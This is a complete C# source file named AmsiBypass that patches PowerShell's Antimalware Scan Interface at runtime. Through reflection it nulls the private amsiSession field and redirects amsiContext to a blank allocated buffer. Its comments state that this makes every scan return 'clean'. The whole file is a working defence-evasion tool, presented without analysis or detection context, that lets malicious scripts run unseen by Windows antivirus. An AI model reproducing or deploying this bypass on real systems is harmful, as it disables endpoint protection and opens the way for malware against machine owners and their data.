using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace AmBypass
{
    public static class AmsiBypass
    {
        public static void Patch()
        {
            Type amsiUtils = Type.GetType(
                "System.Management.Automation.AmsiUtils," +
                " System.Management.Automation");
            if (amsiUtils == null)
                throw new Exception("AmsiUtils not found; requires PowerShell");

            // Allocate a fake AMSI context buffer.
            // 9076 bytes is the size of the AMSI_CONTEXT structure
            // that Windows allocates internally. AMSI will not scan
            // if it's pointed at an empty buffer.
            IntPtr fakeContext = Marshal.AllocHGlobal(9076);

            // amsiSession is the handle PowerShell opened during
            // its own AMSI initialization. Setting it to null makes
            // PowerShell think there's no active session.
            FieldInfo amsiSession = amsiUtils.GetField(
                "amsiSession",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (amsiSession != null)
                amsiSession.SetValue(null, null);

            // amsiContext is what AmsiScanBuffer dereferences. Point
            // it at our fake buffer. Now AMSI scans a blank context
            // and always returns "clean".
            FieldInfo amsiContext = amsiUtils.GetField(
                "amsiContext",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (amsiContext == null)
                throw new Exception("amsiContext field not found");
            amsiContext.SetValue(null, fakeContext);
        }
    }
}